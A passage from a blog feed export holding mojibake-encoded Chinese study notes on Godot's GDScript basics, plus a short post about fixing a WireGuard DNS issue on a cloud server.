class="hljs-operator">...</span><br></code></pre></td></tr></table></figure><h1 id="7-Introduction-to-Member-Variables"><a href="#7-Introduction-to-Member-Variables" class="headerlink" title="7. Introduction to Member Variables"></a>7. Introduction to Member Variables</h1><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">run</span>():</span><br><span class="hljs-function">    <span class="hljs-title">rotate</span>(<span class="hljs-number">0.3</span>)</span><br></code></pre></td></tr></table></figure><p>å®é™…ä¸Šæ˜¯å‡é«˜è¿™ä¸ª entity çš„ rotation æˆå‘˜å˜é‡.</p><h2 id="Accessing-sub-variables-with-the-dot"><a href="#Accessing-sub-variables-with-the-dot" class="headerlink" title="Accessing sub-variables with the dot"></a>Accessing sub-variables with the dot</h2><p>å¾ˆå¤š Member variables æœ‰ sub-values, ç”¨ <code>.</code> æ¥ä½¿ç”¨.</p><p>å¦‚ï¼Œè°ƒæ•´ entity çš„ä½ç½®:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">func <span class="hljs-title">run</span><span class="hljs-params">()</span>:</span><br><span class="hljs-function">    position.x =</span> <span class="hljs-number">180</span><br>    position.y = <span class="hljs-number">120</span><br></code></pre></td></tr></table></figure><p><img src="/../img/coordinate_in_game.png"></p><p>è°ƒæ•´ entity çš„å¤§å°:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span> run():<br>    <span class="hljs-attribute">scale</span>.x = <span class="hljs-number">1</span>.<span class="hljs-number">5</span><br>    <span class="hljs-attribute">scale</span>.y = <span class="hljs-number">1</span>.<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h1 id="8-Defining-Your-Own-Variables"><a href="#8-Defining-Your-Own-Variables" class="headerlink" title="8. Defining Your Own Variables"></a>8. Defining Your Own Variables</h1><p>ä½¿ç”¨ <code>var</code> å…³é”®å­—:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">var</span> <span class="hljs-variable language_">health</span><br></code></pre></td></tr></table></figure><p>é‡å¤å®šä¹‰ä¼šæŠ¥é”™.</p><h1 id="9-Adding-and-Subtracting"><a href="#9-Adding-and-Subtracting" class="headerlink" title="9. Adding and Subtracting"></a>9. Adding and Subtracting</h1><h1 id="10-The-Game-Loop"><a href="#10-The-Game-Loop" class="headerlink" title="10. The Game Loop"></a>10. The Game Loop</h1><h1 id="11-Time-Delta"><a href="#11-Time-Delta" class="headerlink" title="11. Time Delta"></a>11. Time Delta</h1><p>æ¯ä¸€ä¸ªæ¸¸æˆè„šæœ¬éƒ½åŒ…å« <code>_process(delta)</code> å‡½æ•°.</p><p>FPS å°±æ˜¯ Frames Per Second, ä¸€å¸§å°±æ˜¯ä¸€å¹…å›¾ç‰‡, <code>_process(delta)</code> å°±æ˜¯æ›´æ–°å›¾ç‰‡. æ¯ç§’æ›´æ–° 60 æ¬¡å°±æ˜¯ 60 å¸§.</p><h2 id="Frames-take-varying-amounts-of-time-to-calculate"><a href="#Frames-take-varying-amounts-of-time-to-calculate" class="headerlink" title="Frames take varying amounts of time to calculate"></a>Frames take varying amounts of time to calculate</h2><p><code>delta</code> çš„æ„æ€æ˜¯ a time difference.</p><p><code>delta</code> æŒ‡ä»£çš„æ˜¯ Godot å¤„ç† previous frame çš„æ—¶é—´ï¼Œå•ä½æ˜¯ç§’. å…¶å€¼åœ¨å¤„ç†æ¯ä¸ª frame æ—¶éƒ½ä¼šå˜åŒ–.</p><p>è¿™ä¸ªå€¼è¦æ—¶åˆ»è€ƒè™‘.</p><p>å¦‚:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">func</span> <span class="hljs-function"><span class="hljs-title">_process</span>(<span class="hljs-variable">delta</span>):</span><br><span class="hljs-function">    <span class="hljs-title">rotate</span>(<span class="hljs-number">2</span> * <span class="hljs-variable">delta</span>)</span><br></code></pre></td></tr></table></figure><p>è¿™å°±ä½¿å¾—æ—‹è½¬çš„è§’åº¦æ˜¯å’Œæ—¶é—´ç›¸å…³çš„å‡½æ•°ï¼Œæ—¶é—´è‚¯å®šæ˜¯å‡åŒ€å˜åŒ–çš„ï¼Œå› æ­¤æ—‹è½¬çš„è§’åº¦ä¹Ÿæ˜¯åŒ€é€Ÿçš„, å¦‚æœä¸è¿™æ ·å†™ï¼Œå› ä¸ºå¤„ç†æ¯ä¸€å¸§æ‰€èŠ±çš„æ—¶é—´ä¸åŒï¼Œè½¬åŠ¨ç›¸åŒè§’åº¦æ‰€èŠ±çš„æ—¶é—´å°±ä¼šä¸åŒï¼Œä¼šé€ æˆä¸åŒ€é€Ÿå˜åŒ–.</p><h1 id="12-Using-Variables-to-Make-Code-Easier-to-Read"><a href="#12-Using-Variables-to-Make-Code-Easier-to-Read" class="headerlink" title="12. Using Variables to Make Code Easier to Read"></a>12. Using Variables to Make Code Easier to Read</h1><p>åœ¨å‡½æ•°ä¸­å®šä¹‰çš„å˜é‡åªèƒ½åœ¨å‡½æ•°ä¸­ä½¿ç”¨.</p><h1 id="13-Conditions"><a href="#13-Conditions" class="headerlink" title="13. Conditions"></a>13. Conditions</h1><p><code>if</code> è¯­å¥:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">if</span> condition:<br>    <span class="hljs-params">...</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> condition:<br>    <span class="hljs-params">...</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-params">...</span><br></code></pre></td></tr></table></figure><h1 id="14-Multiplying"><a href="#14-Multiplying" class="headerlink" title="14. Multiplying"></a>14. Multiplying</h1><h1 id="15-Modulo"><a href="#15-Modulo" class="headerlink" title="15. Modulo"></a>15. Modulo</h1><p>å–ä½™åªèƒ½ä½œç”¨äºæ•´æ•°.</p><h2 id="Using-modulo-to-find-even-and-odd-numbers"><a href="#Using-modulo-to-find-even-and-odd-numbers" class="headerlink" title="Using modulo to find even and odd numbers"></a>Using modulo to find even and odd numbers</h2><h2 id="Calculating-a-random-number-within-a-range"><a href="#Calculating-a-random-number-within-a-range" class="headerlink" title="Calculating a random number within a range"></a>Calculating a random number within a range</h2><p>ä½¿ç”¨ <code>randi()</code> (random integer) å‡½æ•°å¯ä»¥è·å¾—ä¸€ä¸ªéšæœºæ•´æ•°.</p><h1 id="16-2D-Vectors"><a href="#16-2D-Vectors" class="headerlink" title="16. 2D Vectors"></a>16. 2D Vectors</h1><p>ä¹‹æ‰€ä»¥ <code>scale</code> å˜é‡æœ‰ä¸¤ä¸ª sub-variables æ˜¯å› ä¸º  <code>scale</code> æ˜¯ä¸€ä¸ª 2 ç»´å‘é‡ Vector2.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span> level_up():<br>    <span class="hljs-attribute">scale</span> += Vector2(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>, <span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>å…¶å’Œ:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span> level_up():<br>    <span class="hljs-attribute">scale</span>.x += <span class="hljs-number">0</span>.<span class="hljs-number">2</span><br>    <span class="hljs-attribute">scale</span>.y += <span class="hljs-number">0</span>.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ç­‰ä»·.</p><p><code>Vector2()</code> è¢«ç§°ä½œæ„é€ å‡½æ•°.</p><h2 id="Using-vectors-to-change-the-position"><a href="#Using-vectors-to-change-the-position" class="headerlink" title="Using vectors to change the position"></a>Using vectors to change the position</h2><h1 id="17-Introduction-to-While-Loops"><a href="#17-Introduction-to-While-Loops" class="headerlink" title="17. Introduction to While Loops"></a>17. Introduction to While Loops</h1><p>å¦‚:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">while</span> <span class="hljs-keyword">number</span> &lt; <span class="hljs-number">4</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">number</span>)<br></code></pre></td></tr></table></figure><h1 id="18-Introduction-to-For-Loops"><a href="#18-Introduction-to-For-Loops" class="headerlink" title="18. Introduction to For Loops"></a>18. Introduction to For Loops</h1><p>å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> number in range(<span class="hljs-number">3</span>):<br>    <span class="hljs-attribute">cell</span> += Vector2(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><code>range(3)</code> è¿”å›çš„æ˜¯ <code>[0, 1, 2]</code>, èŒƒå›´æ˜¯ <code>0 ~ n-1</code></p><h2 id="array"><a href="#array" class="headerlink" title="array"></a>array</h2><p>å¦‚:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> arr = <span class="hljs-selector-attr">[0, 1, 2]</span><br></code></pre></td></tr></table></figure><h1 id="19-Creating-arrays"><a href="#19-Creating-arrays" class="headerlink" title="19. Creating arrays"></a>19. Creating arrays</h1><p>ç”¨æ•°ç»„æ¥å­˜å‚¨è·¯å¾„ï¼Œå¦‚:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">var turtle_path = [ Vector<span class="hljs-number">2</span><span class="hljs-comment">(1,0)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(1,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(2,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(3,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(4,1)</span>, Vector<span class="hljs-number">2</span><span class="hljs-comment">(5,1)</span>,   ]<br></code></pre></td></tr></table></figure><h1 id="20-Looping-over-arrays"><a href="#20-Looping-over-arrays" class="headerlink" title="20. Looping over arrays"></a>20. Looping over arrays</h1><p>å¦‚:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> numbers = [ <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span> ]<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">number</span> in numbers:<br>    print(<span class="hljs-built_in">number</span>)<br></code></pre></td></tr></table></figure><p><code>in</code> å…³é”®è¯å¯ä»¥ç¡®å®šä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨æ•°ç»„ä¸­:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-keyword">if</span> cell in cells:<br>    ...<br></code></pre></td></tr></table></figure><p><code>append()</code> å‡½æ•°åœ¨æ•°ç»„åé¢åŠ ä¸Šä¸€ä¸ªå…ƒç´ :</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">selected_units.<span class="hljs-built_in">append</span>(cell)<br></code></pre></td></tr></table></figure><h1 id="21-Strings"><a href="#21-Strings" class="headerlink" title="21. Strings"></a>21. Strings</h1><p>å’Œ C è¯­è¨€ä¸€æ ·ï¼ŒStrings æœ¬è´¨ä¸Šè¿˜æ˜¯æ•°ç»„:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">for</span> <span class="hljs-keyword">character</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;Robot&quot;</span>:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-keyword">character</span>)<br></code></pre></td></tr></table></figure><h1 id="22-Functions-that-return-a-value"><a href="#22-Functions-that-return-a-value" class="headerlink" title="22. Functions that return a value"></a>22. Functions that return a value</h1><p>ä½¿ç”¨ <code>round()</code> å‡½æ•°ï¼Œå¯ä»¥å°†å°æ•°æˆªå°¾:</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-keyword">var</span> rounded_health = <span class="hljs-built_in">round</span>(<span class="hljs-variable language_">health</span>)<br></code></pre></td></tr></table></figure><p><code>lerp()</code> (linear interpolate) å‡½æ•°.</p><p>ä½¿ç”¨ <code>return</code> å…³é”®å­—è¿”å›å€¼.</p><h1 id="23-Appending-and-poping-values-from-arrays"><a href="#23-Appending-and-poping-values-from-arrays" class="headerlink" title="23. Appending and poping values from arrays"></a>23. Appending and poping values from arrays</h1><p>æ•°ç»„çš„ä¸‰ä¸ªæˆå‘˜å‡½æ•°:</p><ul><li><code>append()</code></li><li><code>pop_front()</code></li><li><code>pop_back()</code></li></ul><p>å¯ä»¥ç”¨ <code>print</code> ç›´æ¥è¾“å‡ºæ•°ç»„å†…å®¹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">var</span> crates = <span class="hljs-selector-attr">[<span class="hljs-string">&quot;sword&quot;</span>, <span class="hljs-string">&quot;shield&quot;</span>, <span class="hljs-string">&quot;gems&quot;</span>]</span><br><br>func <span class="hljs-built_in">run</span>():<br>    crates<span class="hljs-selector-class">.pop_back</span>()<br>    <span class="hljs-built_in">print</span>(crates)<br></code></pre></td></tr></table></figure><p>åˆ¤æ–­æ•°ç»„æ˜¯å¦ä¸ºç©ºå¯ä»¥:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> crates = [<span class="hljs-string">&quot;sword&quot;</span>, <span class="hljs-string">&quot;shield&quot;</span>, <span class="hljs-string">&quot;gems&quot;</span>]<br><br><span class="hljs-keyword">while</span> crates:<br>    ...<br></code></pre></td></tr></table></figure><h1 id="24-Accessing-values-in-arrays"><a href="#24-Accessing-values-in-arrays" class="headerlink" title="24. Accessing values in arrays"></a>24. Accessing values in arrays</h1><p>è®¿é—®æ•°ç»„æ—¶å¯ä»¥æœ‰è´Ÿæ•°çš„ index å¦‚:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">func <span class="hljs-built_in">run</span>():<br>    <span class="hljs-built_in">use_item</span>(inventory[-<span class="hljs-number">2</span>])<br></code></pre></td></tr></table></figure><h2 id="You-canâ€™t-access-non-existent-indices"><a href="#You-canâ€™t-access-non-existent-indices" class="headerlink" title="You canâ€™t access non-existent indices"></a>You canâ€™t access non-existent indices</h2><p>æ— æ³•è®¿é—®ä¸å­˜åœ¨çš„ index.</p><p>å¯ä»¥ç”¨ <code>size()</code> æˆå‘˜å‡½æ•°æ¥è·å–æ•°ç»„çš„é•¿åº¦.</p><h1 id="25-Creating-Dictionaries"><a href="#25-Creating-Dictionaries" class="headerlink" title="25. Creating Dictionaries"></a>25. Creating Dictionaries</h1><p>å¦‚:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> <span class="hljs-built_in">dictionary</span> = &#123;<br>    <span class="hljs-attr">key1</span>: value_1,<br>    <span class="hljs-attr">key2</span>: value_2,<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯ä¸€ä¸ª key å¿…é¡»å”¯ä¸€.</p><p>Dictionaries ä¹Ÿè¢«å«åš mappings æˆ–è€… associate arrays.</p><p>Dictionaries ä½¿ç”¨ Hash ç®—æ³•ï¼ŒHash ç®—æ³• convert one value into another. æˆ‘ä»¬æä¾›ä¸€ä¸ª key, è¿™ä¸ª key è¢«ç”¨äºè®¡ç®—ä¸€ä¸ª Hash å€¼ï¼Œç„¶åç”¨è¿™ä¸ª Hash å€¼å½“ä½œ index æ¥è®¿é—®å¯¹åº”çš„å…ƒç´ . æœ¬è´¨ä¸Šè¿˜æ˜¯æ•°ç»„ï¼Œåªä¸è¿‡ index ä¸º Hash å€¼.</p><p>è®¿é—®:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">dictionary</span>[key]<br></code></pre></td></tr></table></figure><h1 id="26-Looping-over-dictionaries"><a href="#26-Looping-over-dictionaries" class="headerlink" title="26. Looping over dictionaries"></a>26. Looping over dictionaries</h1><p>ä¸¤ä¸ªæˆå‘˜å‡½æ•°:</p><ul><li><code>keys()</code></li><li><code>values()</code><br>å…¶è¿”å›æ•°ç»„.</li></ul><h1 id="27-Value-types"><a href="#27-Value-types" class="headerlink" title="27. Value types"></a>27. Value types</h1><p>å¯ä»¥ç”¨ <code>+</code> æ¥è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello &quot;</span> + <span class="hljs-string">&quot;there&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>ç±»å‹è½¬æ¢:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">str</span><span class="hljs-params">(number)</span></span><br></code></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºå­—ç¬¦ä¸².</p><p>åŒæ ·æœ‰:</p><ul><li><code>int()</code></li><li><code>float()</code></li></ul><h1 id="28-Specifying-types-with-type-hints"><a href="#28-Specifying-types-with-type-hints" class="headerlink" title="28. Specifying types with type hints"></a>28. Specifying types with type hints</h1><p>å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> cell_size: Vector2 = Vector2(<span class="hljs-number">50</span>.<span class="hljs-number">0</span>, <span class="hljs-number">50</span>.<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥å†™æˆ:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> cell_size := Vector2(<span class="hljs-number">50</span>.<span class="hljs-number">0</span>, <span class="hljs-number">50</span>.<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Godot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ä½¿ç”¨åä¸ºäº‘é¦™æ¸¯æœåŠ¡å™¨å¼€å¯-wireguard-ä¹‹åæ— æ³•è¿æ¥è°·æ­Œ</title>
    <link href="/2022/11/12/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8%E5%8D%8E%E4%B8%BA%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF-wireguard-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%B0%B7%E6%AD%8C/"/>
    <url>/2022/11/12/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8%E5%8D%8E%E4%B8%BA%E4%BA%91%E9%A6%99%E6%B8%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E5%90%AF-wireguard-%E4%B9%8B%E5%90%8E%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E8%B0%B7%E6%AD%8C/</url>
    
    <content type="html"><![CDATA[<p>æœ€ç»ˆè§£å†³æ–¹æ³•æ˜¯æ¢äº†ä¸€ä¸ª DNS æœåŠ¡å™¨ï¼ŒåŸæ¥æ˜¯ <code>14.14.14.14</code>, æ”¹æˆäº†è°·æ­Œçš„ <code>8.8.8.8</code>, å³å¯.</p><p><img src="/../img/change_14_to_8_DNS.png"></p><h1 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h1><p>å…ˆå°† wg0 å…³é—­, ç„¶åè¿½è¸ªä¸€ä¸‹æ•°æ®åŒ…ï¼Œé€Ÿåº¦å¾ˆå¿«ï¼Œå‡ ä¹ä¸åˆ°ä¸€ç§’é’Ÿ:<br><img src="/../img/traceroute_without_wg0.png"></p><p>ç„¶åå°† wg0 å¯ç”¨ï¼Œå†æ¬¡è¿½è¸ªæ•°æ®åŒ…, å‘ç°è·¯å¾„ä¸åŒ, ä¸”æå…¶ç¼“æ…¢:<br><img src="/../img/traceroute_with_wg0.png"></p><p>çŒœæµ‹å¯èƒ½æ˜¯è·¯ç”±å¯»å€çš„é—®é¢˜, å°±å…ˆæ¢äº†ä¸‹ DNS æœåŠ¡å™¨ï¼Œç»“æœå¯è¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-godot-ä½¿ç”¨</title>
    <link href="/2022/11/11/%E5%85%B3%E4%BA%8E-godot-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/11/11/%E5%85%B3%E4%BA%8E-godot-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV14Y411h7Po?p=7&spm_id_from=pageDriver&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></p><p>label èŠ‚ç‚¹ç”¨äºå†™æ–‡å­—.</p><p>åœºæ™¯è§†å›¾å’Œæ¸¸æˆè§†å›¾:</p><ul><li>åœºæ™¯è§†å›¾æ˜¯åœ¨ç¼–è¾‘å™¨ä¸­çœ‹åˆ°çš„è§†å›¾</li><li>æ¸¸æˆè§†å›¾æ˜¯è¿è¡Œåçš„çª—å£</li></ul><p>å­èŠ‚ç‚¹çš„åæ ‡æ˜¯ç›¸å¯¹äºçˆ¶èŠ‚ç‚¹çš„.</p><p>æ¸¸æˆçª—å£çš„å¤§å°å¯è°ƒæ•´.</p><p>ä¸€ä¸ªå¯¹è±¡çš„åæ ‡æ˜¯å…¶ pivot (ä¸­å¿ƒç‚¹) çš„åæ ‡.</p><p>å›¾ç‰‡å»é™¤èƒŒæ™¯. PNG å›¾ç‰‡å¯é€æ˜èƒŒæ™¯.</p><p>å¯åˆ‡å‰²ä½¿ç”¨å›¾ç‰‡ (åªä½¿ç”¨å›¾ç‰‡çš„ä¸€éƒ¨åˆ†)</p><p>ä¸€ä¸ªèŠ‚ç‚¹çš„ç§ç±»å¯ä»¥ç›´æ¥æ”¹å˜.</p><p>Node èŠ‚ç‚¹ (ä¸æ˜¯ Node2D) çš„ç‰¹ç‚¹æ˜¯å¯ä»¥æŒ‚è½½è„šæœ¬.</p><p>ä¸¤ä¸ªé‡è¦çš„æ–¹æ³•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gdscript"># è„šæœ¬åˆå§‹åŒ–ä¼šé¦–å…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œä¼šåœ¨_process()æ–¹æ³•ä¹‹å‰è°ƒç”¨<br>func _ready():<br># get_tree().paused = true<br>pass<br><br>var count = 0<br># æ¯ä¸€å¸§éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•<br>func _process(delta):<br>count = count + 1<br><br>if (count % 60 == 0):<br>print(&quot;parent node&quot;)<br>pass<br></code></pre></td></tr></table></figure><p>çˆ¶èŠ‚ç‚¹çš„æ–¹æ³•å…ˆæ‰§è¡Œ. <code>_ready</code> æ–¹æ³•æ˜¯æœ€å…ˆè°ƒç”¨çš„.</p><p>éå†çš„é¡ºåºå¯ä»¥é€šè¿‡ä¿®æ”¹ä¼˜å…ˆçº§æ”¹å˜.</p><p>å¯æ”¹å˜æ¸²æŸ“çš„é¡ºåºï¼Œè°ƒæ•´å›¾å±‚çš„ä¸Šä¸‹å…³ç³».</p><p>z index ä¹Ÿå¯ä»¥æ”¹å˜æ¸²æŸ“é¡ºåº (æ¯•ç«Ÿæ˜¯ Z è½´, ä¸‰ç»´åæ ‡). </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">extends</span> <span class="hljs-title class_">Node2D</span>    <br></code></pre></td></tr></table></figure><p>è¿™è¡Œä»£ç è¡¨ç¤ºä» <code>Node2D</code> èŠ‚ç‚¹ç»§æ‰¿.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">export <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span><br></code></pre></td></tr></table></figure><p><code>export</code> åº”è¯¥æ˜¯å£°æ˜ä¸ºå…¨å±€å˜é‡.</p><p>æ¯ä¸€ä¸ªèŠ‚ç‚¹å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªç±»ï¼Œæœ‰å¾ˆå¤šå¯ç”¨çš„æ–¹æ³•.</p><p>å°½é‡ç»§æ‰¿ <code>Node2D</code> èŠ‚ç‚¹.</p><p>å®šä¹‰å˜é‡ä½¿ç”¨ <code>var</code> å…³é”®è¯.</p><h1 id="1-å˜é‡å’Œæ•°æ®ç±»å‹"><a href="#1-å˜é‡å’Œæ•°æ®ç±»å‹" class="headerlink" title="1. å˜é‡å’Œæ•°æ®ç±»å‹"></a>1. å˜é‡å’Œæ•°æ®ç±»å‹</h1><p>ç±»å‹å¯åŠ å¯ä¸åŠ :</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-built_in">var</span> <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;This is a string&quot;</span><br><span class="hljs-built_in">var</span> <span class="hljs-built_in">str</span>: String = <span class="hljs-string">&quot;This is a string&quot;</span><br></code></pre></td></tr></table></figure><p>åŠ ä¸åŠ ç±»å‹ä¼šå½±å“é»˜è®¤å€¼ (ä¹Ÿå°±æ˜¯æ²¡æœ‰ç»™ä»–åˆå§‹åŒ–æ—¶çš„å€¼).</p><p><code>typeof()</code> æ–¹æ³•å¯ä»¥å¤„å¤„ç±»å‹.</p><p><code>self</code> è¡¨ç¤ºç±»è‡ªå·±:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(self <span class="hljs-keyword">is</span> Node)<br></code></pre></td></tr></table></figure><p>è¾“å‡º <code>Ture</code> æˆ– <code>False</code>.</p><p><code>int</code> çš„èŒƒå›´æ˜¯ $-2^64+1 ~ 2^64 - 1$.</p><h1 id="2-å¯¼å‡ºå˜é‡"><a href="#2-å¯¼å‡ºå˜é‡" class="headerlink" title="2. å¯¼å‡ºå˜é‡"></a>2. å¯¼å‡ºå˜é‡</h1><p>ä½¿ç”¨ <code>export</code>, å°±æ˜¯åœ¨å³ä¾§å¯ä»¥ç›´æ¥ä¿®æ”¹è€Œä¸æ˜¯ä¿®æ”¹æºä»£ç .<br><img src="/../img/gdscript_export.png"></p><h1 id="3-å‡½æ•°"><a href="#3-å‡½æ•°" class="headerlink" title="3. å‡½æ•°"></a>3. å‡½æ•°</h1><p>ç¤ºä¾‹:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">func</span> <span class="hljs-title function_">func_name</span><span class="hljs-params">(parameters)</span>:<br>    body<br>    <span 